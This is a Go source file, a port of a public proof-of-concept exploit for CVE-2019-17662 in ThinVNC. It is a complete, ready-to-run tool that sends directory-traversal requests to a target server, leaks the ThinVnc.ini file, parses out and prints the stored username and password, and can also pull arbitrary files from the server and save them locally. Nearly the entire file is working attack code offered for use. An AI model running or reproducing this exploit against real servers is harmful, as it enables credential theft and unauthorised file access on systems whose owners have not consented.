//============================================================
//
// Author: Thomas Osgood
//
// Golang version of exploit found in:
//
//		https://github.com/MuirlandOracle/CVE-2019-17662
//
//============================================================
package main

import (
	"errors"
	"flag"
	"fmt"
	"io/ioutil"
	"net/http"
	"os"
	"regexp"
	"strings"
	"time"
)

const EnableVirtualTerminalProcessing uint32 = 0x4

var ANSI_SET bool = false

var ANSI_CLRLN string = "\r\x1b[2K\r"
var ANSI_CLRSC string = "\x1b[2J\x1b[H"
var ANSI_RST string = "\x1b[0m"
var ANSI_RED string = "\x1b[31;1m"
var ANSI_GRN string = "\x1b[32;1m"
var ANSI_YLW string = "\x1b[33;1m"
var ANSI_BLU string = "\x1b[34;1m"

type Client struct {
	baseURL string
	Route   string
	Session *http.Client
}

type CredStruct struct {
	Username string
	Password string
}

// ============================================================
//
// Function Name: GetBodyContent
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take make a GET request to a target
//  route and return the body content to the user.
//
// Input(s):
//
//  route - string. route to make GET request on.
//
// Return(s):
//
//  bodycontent - []byte. content pulled from target URL.
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) GetBodyContent(route string) (bodycontent []byte, err error) {
	var targetURL string = fmt.Sprintf("%s/%s", c.baseURL, route)

	resp, err := c.Session.Get(targetURL)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()

	bodycontent, err = ioutil.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	return bodycontent, nil
}

// ============================================================
//
// Function Name: GetFile
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to pull the contents of a specified file
//  from a vulnerable Atlas server.
//
// Input(s):
//
//  filename - string. file to attempt to pull down.
//
// Return(s):
//
//  contents - []byte. contents of specified file.
//  err - error. error or nil.
//
// ============================================================
func (c *Client) GetFile(filename string, depth int) (contents []byte, err error) {
	var dirwalk string

	if depth < 1 {
		return nil, errors.New("depth must be 1 or larger")
	}

	for i := 0; i < depth; i++ {
		dirwalk = fmt.Sprintf("%s../", dirwalk)
	}
	dirwalk = dirwalk[:len(dirwalk)-1]

	var route string = fmt.Sprintf("%s/%s", dirwalk, filename)

	contents, err = c.GetBodyContent(route)
	if err != nil {
		return nil, err
	}

	if len(contents) < 1 {
		return nil, errors.New(fmt.Sprintf("no content discovered in \"%s\"", route))
	} else if strings.Contains(string(contents), "<TITLE>404 Not Found</TITLE>") {
		return nil, errors.New(fmt.Sprintf("\"%s\" not found on server", filename))
	}

	return contents, nil
}

// ============================================================
//
// Function Name: GetThinVNCIni
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to pull the credentials from Atlas'
//  ThinVnc.ini file.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  creds - CredStruct. object holding user and password.
//  err - error. error or nil.
//
// ============================================================
func (c *Client) GetThinVNCIni() (creds CredStruct, err error) {
	var bodycontent []byte
	const targetfile string = "../ThinVnc.ini"

	bodycontent, err = c.GetBodyContent(targetfile)
	if err != nil {
		return CredStruct{}, err
	}

	creds.Username, err = FindMatch(bodycontent, "User=([^\r]*)")
	if err != nil {
		return CredStruct{}, err
	}

	if len(creds.Username) < 1 {
		return CredStruct{}, errors.New("no username discovered")
	}

	if splituser := strings.Split(creds.Username, "="); len(splituser) < 2 {
		return CredStruct{}, errors.New("User= does not have username associated with it")
	} else {
		creds.Username = splituser[1]
	}

	creds.Password, err = FindMatch(bodycontent, "Password=([^\r]*)")
	if err != nil {
		return CredStruct{}, err
	}

	if splitpass := strings.Split(creds.Password, "="); len(splitpass) < 2 || len(creds.Password) < 1 {
		return CredStruct{}, errors.New(fmt.Sprintf("cannot find password for \"%s\"", creds.Username))
	} else {
		creds.Password = splitpass[1]
	}

	return creds, nil
}

// ============================================================
//
// Function Name: Testconnection
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to test the connection to a target.
//
// Input(s):
//
//  None.
//
// Return(s):
//
//  success - bool. indication of success.
//  message - string. status message.
//
// ============================================================
func (c *Client) TestConnection() (success bool, message string) {
	SysMsgNB(fmt.Sprintf("testing connection to \"%s\"", c.baseURL))

	resp, err := c.Session.Get(c.baseURL)
	if err != nil {
		return false, err.Error()
	}
	defer resp.Body.Close()

	return true, "client connection successful"
}

func SucMsg(msg string) {
	fmt.Printf("%s[%s+%s] %s\n", ANSI_CLRLN, ANSI_GRN, ANSI_RST, msg)
	return
}

func ErrMsg(msg string) {
	fmt.Printf("%s[%s-%s] %s\n", ANSI_CLRLN, ANSI_RED, ANSI_RST, msg)
	return
}

func InfMsg(msg string) {
	fmt.Printf("%s[%si%s] %s\n", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func InfMsgNB(msg string) {
	fmt.Printf("%s[%si%s] %s", ANSI_CLRLN, ANSI_BLU, ANSI_RST, msg)
	return
}

func SysMsg(msg string) {
	fmt.Printf("%s[%s*%s] %s\n", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func SysMsgNB(msg string) {
	fmt.Printf("%s[%s*%s] %s", ANSI_CLRLN, ANSI_YLW, ANSI_RST, msg)
	return
}

func ValidatePort(portno int) (success bool, message string) {
	if (portno < 1) || (portno > 65535) {
		return false, "port must be between 1 and 65535"
	}
	return true, "port valid"
}

//============================================================
//
// Function Name: PrintCenter
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to print a message in the center of a
//  specified number of columns (n).
//
// Input(s):
//
//  msg - string. message to display.
//  n - int. total number of columns in row.
//
// Return(s):
//
//  None
//
//============================================================
func PrintCenter(msg string, n int) {
	var ansi_indent string = "\x1b%s"
	var indent_format string = "[%dC"
	var indent int

	fmt.Printf("%s", ANSI_CLRLN)
	if len(msg) > n {
		fmt.Printf("%s\n", msg)
		return
	}

	indent = (n - len(msg)) / 2
	indent_format = fmt.Sprintf(indent_format, indent)
	ansi_indent = fmt.Sprintf(ansi_indent, indent_format)

	fmt.Printf("%s%s%s%s\n", ansi_indent, ANSI_YLW, msg, ANSI_RST)

	return
}

func PrintChar(char byte, n int) {
	if n < 1 {
		return
	}

	for i := 0; i < n; i++ {
		fmt.Printf("%s%s%s", ANSI_RED, string(char), ANSI_RST)
	}
	fmt.Printf("\n")
}

//============================================================
//
// Function Name: FindMatch
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take a byte slice, search the slice
//  for a given regular expression pattern, and return the
//  first match of that pattern.
//
// Input(s):
//
//  bodycontent - []byte. byte slice to search for pattern.
//  tgtpattern - string. regex pattern to search for.
//
// Return(s):
//
//  match - string. first match of pattern discovered.
//  success - bool. indication of success.
//  message - string. status message.
//
//============================================================
func FindMatch(bodycontent []byte, tgtpattern string) (match string, err error) {

	re, err := regexp.Compile(tgtpattern)
	if err != nil {
		return "", err
	}

	matches := re.FindAll(bodycontent, -1)

	if len(matches) < 1 {
		return "", err
	}

	match = string(matches[0])

	return match, nil
}

//============================================================
//
// Function Name: SaveContents
//
// Author: Thomas Osgood
//
// Description:
//
//  Function designed to take save the a byte slice to a
//  file given a filename and byte slice.
//
// Input(s):
//
//  filename - string. filename to save contents to.
//  contents - []byte. contents of file to save.
//
// Return(s):
//
//  err - error. error or nil.
//
//============================================================
func SaveContents(filename string, contents []byte) (err error) {
	var fptr *os.File

	filename = strings.Replace(strings.Replace(strings.Replace(filename, ".", "", -1), "/", "", -1), "\\", "", -1)

	fptr, err = os.OpenFile(filename, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0644)
	if err != nil {
		return err
	}
	defer fptr.Close()

	_, err = fptr.Write(contents)
	if err != nil {
		return err
	}

	return nil
}

func init() {
	return
}

func main() {
	var domain string
	var port int

	var baseURL string
	var scheme string

	var secure bool

	var client Client = Client{Session: &http.Client{Timeout: 10 * time.Second}}

	var creds CredStruct
	var contents []byte
	var err error

	var targetfile string
	var depth int

	flag.StringVar(&domain, "d", "127.0.0.1", "domain or ip address of target")
	flag.IntVar(&port, "p", 80, "port to communicate with target on")
	flag.StringVar(&targetfile, "f", "", "file to pull down from vulnerable server")
	flag.StringVar(&targetfile, "file", "", "file to pull down from vulnerable server")
	flag.BoolVar(&secure, "s", false, "use HTTPS instead of HTTP")
	flag.BoolVar(&secure, "secure", false, "use HTTPS instead of HTTP")
	flag.IntVar(&depth, "depth", 1, "traversal depth to search for file")
	flag.Parse()

	success, message := ValidatePort(port)
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}

	PrintChar('=', 60)
	PrintCenter("Target Information", 60)
	PrintChar('=', 60)
	InfMsg(fmt.Sprintf("Target Domain: %s", domain))
	InfMsg(fmt.Sprintf("Target Port: %d", port))

	if len(targetfile) < 1 {
		InfMsg("Target File: ThinVnc.ini")
	} else {
		InfMsg(fmt.Sprintf("TargetFile: %s", targetfile))
		InfMsg(fmt.Sprintf("Traversal Depth: %d", depth))
	}

	InfMsg(fmt.Sprintf("HTTPS: %v", secure))
	PrintChar('=', 60)

	//============================================================
	// HTTPS check.
	//============================================================
	if secure {
		scheme = "https"
	} else {
		scheme = "http"
	}
	baseURL = fmt.Sprintf("%s://%s:%d", scheme, domain, port)

	client.baseURL = baseURL

	//============================================================
	// Make sure the target is reachable.
	//============================================================
	success, message = client.TestConnection()
	if !success {
		ErrMsg(message)
		os.Exit(1)
	}
	SucMsg(message)

	if len(targetfile) < 1 {
		//============================================================
		// Get credentials by leaking ThinVnc.ini
		//============================================================
		creds, err = client.GetThinVNCIni()
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}
		SucMsg(fmt.Sprintf("Creds Found: \"%s:%s\"", creds.Username, creds.Password))
	} else {
		contents, err = client.GetFile(targetfile, depth)
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}
		SucMsg(fmt.Sprintf(fmt.Sprintf("contents of \"%s\" pulled successfully", targetfile)))

		err = SaveContents(targetfile, contents)
		if err != nil {
			ErrMsg(err.Error())
			os.Exit(1)
		}
	}

	return
}

